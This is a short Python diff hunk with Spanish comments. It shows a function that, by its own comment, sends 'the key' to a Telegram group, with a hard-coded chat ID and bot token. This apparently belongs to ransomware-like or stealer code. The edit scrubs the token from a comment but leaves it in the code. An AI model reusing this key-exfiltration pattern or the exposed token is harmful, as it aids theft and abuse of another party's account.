@@ -60,7 +60,7 @@ def error(): #Mensajes de error con tkinter :D
         exit
 
 def Key_send():#Envia la llave a un grupo de telegram
-    #API DE TELEGRAM CON EL TOKEN DEL BOT --> https://api.telegram.org/bot5060162437:AAFelpBefrX90LAr4n03WX37MVxJs4GAc_w/getupdates#
+    #API DE TELEGRAM CON EL TOKEN DEL BOT --> https://api.telegram.org/{aqui va el token de tu bot}/getupdates#
     
     id = '-779965945' #Id del chat objetivo
     token = "5060162437:AAFelpBefrX90LAr4n03WX37MVxJs4GAc_w" #token del bot
